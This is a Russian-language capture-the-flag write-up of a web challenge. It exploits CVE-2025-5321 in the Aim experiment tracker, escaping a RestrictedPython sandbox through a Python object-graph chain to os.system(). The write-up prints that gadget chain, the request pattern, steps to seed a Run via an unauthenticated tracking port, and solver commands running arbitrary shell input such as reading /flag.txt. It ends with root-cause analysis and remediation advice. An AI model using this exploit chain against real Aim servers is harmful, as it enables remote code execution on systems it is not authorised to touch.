# Brainwash, часть 1 — технический разбор

**Флаг:** `avito{3Xperim3n7s_aR3_unREL1aBl3_BU7_rcE_N3V3R_liEs}`

**Класс:** web / AimQL sandbox escape / CVE-2025-5321 / remote code execution

## Краткое техническое резюме

Web-сервис работает на Aim 3.29.1 и вычисляет пользовательские AimQL predicates при обработке
`GET /api/runs/search/run`. В этой версии CVE-2025-5321 позволяет выйти из ограничений
RestrictedPython через доступный Python object graph и получить ссылку на module `os`.

AimQL predicate вычисляется только для существующего Run. Пустой repository инициализируется через
неаутентифицированный Aim remote-tracking service на Kubernetes NodePort `30800`. После создания
одного Run expression вызывает `os.system()`, читает `/flag.txt`, сохраняет command output в параметре
нового Run и возвращает его через штатный HTTP API.

## 1. Контекст и цель

Target:

```text
https://brainwash-ztkaw810.avitoctf.ru/
```

Приложение предоставляет интерфейс Aim для хранения и анализа experiment runs. Цель task13 —
получить arbitrary command execution в pod `webapp` и прочитать `/flag.txt`.

Постэксплуатация service account и Kubernetes RBAC рассматривается отдельно в
[`../task14/brainwash_task14_writeup.md`](../task14/brainwash_task14_writeup.md) и
[`../task15/brainwash_task15_writeup.md`](../task15/brainwash_task15_writeup.md).

## 2. Reconnaissance и attack surface

HTTP headers, React assets, `/static-files/` и `/openapi.json` идентифицируют Aim. Сопоставление
OpenAPI schema с package API определяет версию 3.29.1.

Для эксплуатации существенны следующие endpoints:

- `GET /api/projects/activity/` — количество Run в repository;
- `GET /api/runs/search/run?q=<predicate>` — server-side evaluation AimQL predicate;
- `GET /api/experiments` и `GET /api/experiments/{id}/runs` — перечисление созданных Run;
- `GET /api/runs/{id}/info` — чтение параметров Run.

CVE-2025-5321 применима к используемой версии. CVE-2024-2195 затрагивает более ранние версии Aim и
не соответствует target version.

Изначально repository не содержит Run, поэтому vulnerable predicate не вычисляется. Стандартный
tracking port `53800` не опубликован. Проверка Kubernetes NodePort range `30000–32767` обнаруживает
Aim remote-tracking service на `30800`; endpoint `/status/` возвращает `{"status":"OK"}`. Service
принимает новые Run без authentication.

## 3. Анализ и проверка гипотез

RestrictedPython expression сохраняет доступ к атрибутам объектов Aim. Следующая цепочка достигает
`sys.modules["os"]` через SQLAlchemy session и DBAPI module:

```python
run.db.runs().session.bind.dialect.dbapi.datetime.sys.modules["os"]
```

Вызов `os.system(<command>) or 1` выполняет shell command и оставляет predicate истинным. Параметр
`limit=1` ограничивает evaluation одним Run и предотвращает повторный запуск payload для всех
записей repository.

Предусловие создаётся через Aim SDK:

```python
from aim import Run

run = Run(repo="aim://<host>:30800", experiment="medoed-self-seed")
run["pwn"] = "one-run-is-enough"
run.close()
```

После появления Run отправляется запрос:

```http
GET /api/runs/search/run?q=<urlencoded-aimql-predicate>&limit=1&skip_system=false&report_progress=false
```

Root filesystem container доступна только для чтения, поэтому command output передаётся через
application data store. Payload запускает command через `subprocess.run()`, создаёт локальный Run в
`/data/repo` и записывает output в параметр `out`. Затем solver находит experiment через HTTP API и
читает `params.out` из `/api/runs/{id}/info`.

## 4. Корневая причина

Exploit формируют три нарушения security boundary:

1. AimQL evaluator обрабатывает attacker-controlled expression в server process.
2. RestrictedPython policy не изолирует capability-bearing object graph; разрешённая цепочка
   атрибутов достигает imported module `os` и произвольных system calls.
3. Неаутентифицированный remote-tracking service опубликован во внешней сети и позволяет создать
   Run, необходимый для активации vulnerable evaluation path.

Проверка синтаксиса expression не обеспечивает sandboxing, если доступные объекты дают транзитивный
доступ к runtime modules и process-level APIs.

## 5. Эксплуатация

End-to-end solver запускается из корня repository:

```bash
uv run python task13/pwn_brainwash.py \
  https://brainwash-ztkaw810.avitoctf.ru/
```

Solver выполняет следующие операции:

1. проверяет количество Run через `/api/projects/activity/`;
2. создаёт один Run через `aim://<host>:30800`, если repository пуст;
3. формирует AimQL gadget и запускает command;
4. сохраняет stdout и stderr в параметре нового Run;
5. извлекает `params.out` через HTTP API и выделяет `avito{...}`.

Для уже инициализированного repository доступен `--skip-seed`; произвольная команда передаётся через
`--command`:

```bash
uv run python task13/pwn_brainwash.py \
  https://brainwash-ztkaw810.avitoctf.ru/ \
  --skip-seed \
  --command 'id; cat /flag.txt'
```

Локальная проверка построения payload:

```bash
uv run python task13/pwn_brainwash.py --self-test
```

## 6. Флаг

```text
avito{3Xperim3n7s_aR3_unREL1aBl3_BU7_rcE_N3V3R_liEs}
```

## 7. Выводы и рекомендации

- Обновить Aim до версии с исправлением CVE-2025-5321.
- Не вычислять пользовательские expressions в application process без capability-safe interpreter
  и строгого allowlist разрешённых операций.
- Исключить из expression context объекты, предоставляющие доступ к database sessions, modules,
  import machinery и process APIs.
- Закрыть remote-tracking service средствами network policy и authentication; не публиковать его
  через внешний NodePort.
- Добавить regression tests для traversal по Python object graph и runtime module recovery.
- Запускать Aim workload с read-only filesystem, минимальным service account и изолированным network
  policy, учитывая, что эти меры ограничивают последствия RCE, но не устраняют уязвимость evaluator.

## 8. Файлы для воспроизведения

Version-controlled artifacts:

- `task13/pwn_brainwash.py` — self-seeding, AimQL payload, command execution и output extraction.
- `task13/rce_exec.py` — интерактивный command channel поверх того же AimQL primitive.

Продолжение цепочки: [`../task14/brainwash_task14_writeup.md`](../task14/brainwash_task14_writeup.md) и
[`../task15/brainwash_task15_writeup.md`](../task15/brainwash_task15_writeup.md).
